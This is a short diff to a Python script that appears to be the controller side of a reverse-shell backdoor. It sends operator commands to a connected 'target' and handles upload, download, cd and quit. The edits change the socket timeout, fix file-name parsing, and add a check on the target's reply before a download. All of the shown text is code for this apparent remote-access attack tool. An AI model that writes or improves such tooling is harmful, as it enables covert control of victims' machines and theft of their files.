@@ -23,7 +23,7 @@ def reliable_recv(sock):
     data = ''
     while not exit_program:
         try:
-            sock.settimeout(10)
+            sock.settimeout(15)
             chunk = sock.recv(4096).decode().rstrip()
             data += chunk
             return json.loads(data)
@@ -67,20 +67,26 @@ def target_communication(sock, ip):
         command_split = command.split(' ')
 
         if command_split[0] == 'upload':
-            toupload = ''.join(command_split[1:])
+            toupload = ' '.join(command_split[1:])
             if os.path.exists(toupload):
                 reliable_send(sock, command)
+                print('Uploading file: ', toupload)
                 upload_file(sock, toupload)
-                continue
             else:
                 print('No such file: ', toupload)
-                continue
+                
+            continue
                 
         reliable_send(sock, command)
         if command_split[0] == 'download':
-            todownload = ''.join(command_split[1:])
-            download_file(sock, todownload)
-        elif command_split[0] == 'quit':
+            todownload = ' '.join(command_split[1:])
+            res = reliable_recv(sock)
+            print(res)
+            if (res.split(' ')[0] == 'Downloading'):
+                download_file(sock, todownload)
+            continue
+        
+        if command_split[0] == 'quit':
             break
         elif command_split[0] == 'cd':
             pass
